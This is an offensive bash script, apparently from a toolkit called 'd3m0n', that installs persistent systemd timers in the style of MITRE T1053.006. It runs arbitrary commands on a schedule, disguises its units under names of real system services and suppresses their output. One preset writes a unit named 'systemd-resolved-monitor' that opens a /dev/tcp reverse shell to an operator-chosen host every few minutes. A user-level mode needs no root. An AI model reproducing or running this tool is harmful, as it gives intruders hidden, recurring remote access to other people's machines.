#!/bin/bash
#
# systemd_timer.sh — T1053.006 Systemd Timer Persistence
#
# Create persistent systemd timer units as an alternative to cron.
# Configurable intervals, legitimate-looking names, optional stealth.
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

TIMER_DIR="/etc/systemd/system"
MARKER="# d3m0n_timer"

# Legitimate-looking service name pool
declare -a LEGIT_NAMES=(
    "system-journal-flush"
    "systemd-tmpclean"
    "apt-daily-clean"
    "fstrim-maintenance"
    "man-db-update"
    "logrotate-daily"
    "dpkg-db-backup"
    "motd-news-update"
    "e2scrub-reap"
    "fwupd-refresh"
)

banner_timer() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║   T1053.006 — Systemd Timer Persistence               ║"
    echo "  ║   Persistent scheduled tasks via systemd timers       ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Root required.${NC}"
        return 1
    fi
    return 0
}

# ── [1] Create custom timer ──
custom_timer() {
    check_root || return 1

    echo -e "${CYAN}[*] Create custom systemd timer${NC}"
    echo ""
    echo -e "${YELLOW}[?] Timer name (e.g. 'backup-sync'):${NC}"
    read -r TIMER_NAME
    echo -e "${YELLOW}[?] Description (e.g. 'System backup synchronization'):${NC}"
    read -r TIMER_DESC
    TIMER_DESC="${TIMER_DESC:-System maintenance task}"
    echo -e "${YELLOW}[?] Command to execute:${NC}"
    read -r TIMER_CMD
    echo -e "${YELLOW}[?] Interval:${NC}"
    echo "  [1] Every minute"
    echo "  [2] Every 5 minutes"
    echo "  [3] Every 15 minutes"
    echo "  [4] Every hour"
    echo "  [5] Every day"
    echo "  [6] Custom OnCalendar expression"
    read -r INTERVAL

    if [[ -z "$TIMER_NAME" || -z "$TIMER_CMD" ]]; then
        echo -e "${RED}[!] Name and command required.${NC}"
        return 1
    fi

    local TIMER_EXPR=""
    case "$INTERVAL" in
        1) TIMER_EXPR="OnUnitActiveSec=60" ;;
        2) TIMER_EXPR="OnUnitActiveSec=300" ;;
        3) TIMER_EXPR="OnUnitActiveSec=900" ;;
        4) TIMER_EXPR="OnUnitActiveSec=3600" ;;
        5) TIMER_EXPR="OnCalendar=daily" ;;
        6)
            echo -e "${YELLOW}[?] OnCalendar expression (e.g. '*-*-* *:00:00'):${NC}"
            read -r CAL_EXPR
            TIMER_EXPR="OnCalendar=${CAL_EXPR}"
            ;;
        *) echo -e "${RED}[!] Invalid.${NC}"; return 1 ;;
    esac

    # Create service unit
    cat > "${TIMER_DIR}/${TIMER_NAME}.service" << SVCEOF
${MARKER}
[Unit]
Description=${TIMER_DESC}

[Service]
Type=oneshot
ExecStart=/bin/bash -c '${TIMER_CMD}'
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SVCEOF

    # Create timer unit
    local TIMER_UNIT="${TIMER_DIR}/${TIMER_NAME}.timer"
    if [[ "$TIMER_EXPR" == OnUnitActiveSec=* ]]; then
        cat > "$TIMER_UNIT" << TMREOF
${MARKER}
[Unit]
Description=${TIMER_DESC} Timer

[Timer]
OnBootSec=60
${TIMER_EXPR}
AccuracySec=1s

[Install]
WantedBy=timers.target
TMREOF
    else
        cat > "$TIMER_UNIT" << TMREOF
${MARKER}
[Unit]
Description=${TIMER_DESC} Timer

[Timer]
${TIMER_EXPR}
Persistent=true

[Install]
WantedBy=timers.target
TMREOF
    fi

    systemctl daemon-reload 2>/dev/null
    systemctl enable "${TIMER_NAME}.timer" 2>/dev/null
    systemctl start "${TIMER_NAME}.timer" 2>/dev/null

    echo -e "${GREEN}[+] Timer '${TIMER_NAME}' installed and started!${NC}"
    echo -e "${YELLOW}[*] Service: ${TIMER_DIR}/${TIMER_NAME}.service${NC}"
    echo -e "${YELLOW}[*] Timer:   ${TIMER_UNIT}${NC}"
    echo -e "${YELLOW}[*] Check: systemctl list-timers --all | grep ${TIMER_NAME}${NC}"
}

# ── [2] Stealth timer with legitimate name ──
stealth_timer() {
    check_root || return 1

    echo -e "${CYAN}[*] Stealth timer — uses a legitimate-looking service name${NC}"
    echo ""
    echo -e "${YELLOW}Available disguises:${NC}"
    for i in "${!LEGIT_NAMES[@]}"; do
        echo -e "  [${i}] ${LEGIT_NAMES[$i]}"
    done
    echo ""
    echo -e "${YELLOW}[?] Select disguise number:${NC}"
    read -r DISGUISE_IDX

    if [[ -z "${LEGIT_NAMES[$DISGUISE_IDX]}" ]]; then
        echo -e "${RED}[!] Invalid selection.${NC}"
        return 1
    fi

    local TIMER_NAME="${LEGIT_NAMES[$DISGUISE_IDX]}"

    echo -e "${YELLOW}[?] Command to execute:${NC}"
    read -r TIMER_CMD
    echo -e "${YELLOW}[?] Interval in minutes [default: 15]:${NC}"
    read -r INTERVAL_MIN
    INTERVAL_MIN="${INTERVAL_MIN:-15}"

    if [[ -z "$TIMER_CMD" ]]; then
        echo -e "${RED}[!] Command required.${NC}"
        return 1
    fi

    local INTERVAL_SEC=$((INTERVAL_MIN * 60))

    # Create service unit
    cat > "${TIMER_DIR}/${TIMER_NAME}.service" << SVCEOF
${MARKER}
[Unit]
Description=System ${TIMER_NAME} Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c '${TIMER_CMD}'
StandardOutput=null
StandardError=null
SVCEOF

    # Create timer unit
    cat > "${TIMER_DIR}/${TIMER_NAME}.timer" << TMREOF
${MARKER}
[Unit]
Description=System ${TIMER_NAME} Timer

[Timer]
OnBootSec=120
OnUnitActiveSec=${INTERVAL_SEC}
AccuracySec=1s

[Install]
WantedBy=timers.target
TMREOF

    systemctl daemon-reload 2>/dev/null
    systemctl enable "${TIMER_NAME}.timer" 2>/dev/null
    systemctl start "${TIMER_NAME}.timer" 2>/dev/null

    echo -e "${GREEN}[+] Stealth timer '${TIMER_NAME}' installed!${NC}"
    echo -e "${YELLOW}[*] Runs every ${INTERVAL_MIN} minutes${NC}"
    echo -e "${YELLOW}[*] Disguised as system maintenance task${NC}"
}

# ── [3] Reverse shell timer preset ──
revshell_timer() {
    check_root || return 1

    echo -e "${CYAN}[*] Reverse shell timer preset${NC}"
    echo ""
    echo -e "${YELLOW}[?] Callback host:port (e.g. 10.10.14.5:4444):${NC}"
    read -r CALLBACK
    local RHOST="${CALLBACK%%:*}"
    local RPORT="${CALLBACK##*:}"

    if [[ -z "$RHOST" || -z "$RPORT" ]]; then
        echo -e "${RED}[!] Host and port required.${NC}"
        return 1
    fi

    echo -e "${YELLOW}[?] Interval in minutes [default: 5]:${NC}"
    read -r INTERVAL_MIN
    INTERVAL_MIN="${INTERVAL_MIN:-5}"

    local TIMER_NAME="systemd-resolved-monitor"
    local INTERVAL_SEC=$((INTERVAL_MIN * 60))

    # Create service
    cat > "${TIMER_DIR}/${TIMER_NAME}.service" << SVCEOF
${MARKER}
[Unit]
Description=Systemd Resolver Monitor

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${RHOST}/${RPORT} 0>&1'
StandardOutput=null
StandardError=null
SVCEOF

    # Create timer
    cat > "${TIMER_DIR}/${TIMER_NAME}.timer" << TMREOF
${MARKER}
[Unit]
Description=Systemd Resolver Monitor Timer

[Timer]
OnBootSec=90
OnUnitActiveSec=${INTERVAL_SEC}
AccuracySec=1s

[Install]
WantedBy=timers.target
TMREOF

    systemctl daemon-reload 2>/dev/null
    systemctl enable "${TIMER_NAME}.timer" 2>/dev/null
    systemctl start "${TIMER_NAME}.timer" 2>/dev/null

    echo -e "${GREEN}[+] Reverse shell timer installed!${NC}"
    echo -e "${YELLOW}[*] Calls back to ${RHOST}:${RPORT} every ${INTERVAL_MIN} minutes${NC}"
    echo -e "${YELLOW}[*] Disguised as: ${TIMER_NAME}${NC}"
}

# ── [4] User-level timer (no root) ──
user_timer() {
    echo -e "${CYAN}[*] User-level systemd timer (no root needed)${NC}"
    echo ""

    local USER_DIR="$HOME/.config/systemd/user"
    mkdir -p "$USER_DIR" 2>/dev/null

    echo -e "${YELLOW}[?] Timer name [default: session-cleanup]:${NC}"
    read -r TIMER_NAME
    TIMER_NAME="${TIMER_NAME:-session-cleanup}"
    echo -e "${YELLOW}[?] Command to execute:${NC}"
    read -r TIMER_CMD
    echo -e "${YELLOW}[?] Interval in minutes [default: 10]:${NC}"
    read -r INTERVAL_MIN
    INTERVAL_MIN="${INTERVAL_MIN:-10}"

    if [[ -z "$TIMER_CMD" ]]; then
        echo -e "${RED}[!] Command required.${NC}"
        return 1
    fi

    local INTERVAL_SEC=$((INTERVAL_MIN * 60))

    cat > "${USER_DIR}/${TIMER_NAME}.service" << SVCEOF
${MARKER}
[Unit]
Description=${TIMER_NAME} service

[Service]
Type=oneshot
ExecStart=/bin/bash -c '${TIMER_CMD}'
SVCEOF

    cat > "${USER_DIR}/${TIMER_NAME}.timer" << TMREOF
${MARKER}
[Unit]
Description=${TIMER_NAME} timer

[Timer]
OnBootSec=60
OnUnitActiveSec=${INTERVAL_SEC}
AccuracySec=1s

[Install]
WantedBy=timers.target
TMREOF

    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable "${TIMER_NAME}.timer" 2>/dev/null
    systemctl --user start "${TIMER_NAME}.timer" 2>/dev/null

    echo -e "${GREEN}[+] User timer '${TIMER_NAME}' installed!${NC}"
    echo -e "${YELLOW}[*] Location: ${USER_DIR}/${NC}"
    echo -e "${YELLOW}[*] Check: systemctl --user list-timers${NC}"
}

# ── [5] List d3m0n timers ──
list_timers() {
    echo -e "${CYAN}[*] D3m0n Systemd Timers:${NC}"
    echo "─────────────────────────────────────────────"

    local found=0
    for f in ${TIMER_DIR}/*.timer ${TIMER_DIR}/*.service "$HOME/.config/systemd/user/"*.timer "$HOME/.config/systemd/user/"*.service; do
        [[ -f "$f" ]] || continue
        if grep -q "$MARKER" "$f" 2>/dev/null; then
            local base
            base=$(basename "$f")
            local status
            if [[ "$f" == *".timer" ]]; then
                if [[ "$f" == *"/user/"* ]]; then
                    status=$(systemctl --user is-active "$base" 2>/dev/null)
                else
                    status=$(systemctl is-active "$base" 2>/dev/null)
                fi
                echo -e "  ${GREEN}[TIMER]${NC}   ${base} — ${status}"
            else
                echo -e "  ${YELLOW}[SERVICE]${NC} ${base}"
            fi
            found=1
        fi
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${YELLOW}No d3m0n timers found.${NC}"
    fi
}

# ── [6] Cleanup ──
cleanup_timers() {
    check_root || return 1

    echo -e "${CYAN}[*] Removing all d3m0n systemd timers...${NC}"

    # System-level
    for f in ${TIMER_DIR}/*.timer ${TIMER_DIR}/*.service; do
        [[ -f "$f" ]] || continue
        if grep -q "$MARKER" "$f" 2>/dev/null; then
            local base
            base=$(basename "$f")
            if [[ "$f" == *".timer" ]]; then
                systemctl stop "$base" 2>/dev/null
                systemctl disable "$base" 2>/dev/null
            fi
            rm -f "$f"
            echo -e "${GREEN}  [+] Removed: ${f}${NC}"
        fi
    done

    # User-level
    local USER_DIR="$HOME/.config/systemd/user"
    for f in "${USER_DIR}"/*.timer "${USER_DIR}"/*.service; do
        [[ -f "$f" ]] || continue
        if grep -q "$MARKER" "$f" 2>/dev/null; then
            local base
            base=$(basename "$f")
            if [[ "$f" == *".timer" ]]; then
                systemctl --user stop "$base" 2>/dev/null
                systemctl --user disable "$base" 2>/dev/null
            fi
            rm -f "$f"
            echo -e "${GREEN}  [+] Removed: ${f}${NC}"
        fi
    done

    systemctl daemon-reload 2>/dev/null
    systemctl --user daemon-reload 2>/dev/null

    echo -e "${GREEN}[+] All d3m0n timers removed.${NC}"
}

# ── MAIN MENU ──
main_menu() {
    banner_timer
    echo -e "  ${CYAN}[1]${NC} Create custom timer"
    echo -e "  ${CYAN}[2]${NC} Stealth timer (legitimate-looking name)"
    echo -e "  ${CYAN}[3]${NC} Reverse shell timer preset"
    echo -e "  ${CYAN}[4]${NC} User-level timer (no root)"
    echo -e "  ${CYAN}[5]${NC} List d3m0n timers"
    echo -e "  ${CYAN}[6]${NC} Cleanup / Remove all"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) custom_timer ;;
        2) stealth_timer ;;
        3) revshell_timer ;;
        4) user_timer ;;
        5) list_timers ;;
        6) cleanup_timers ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
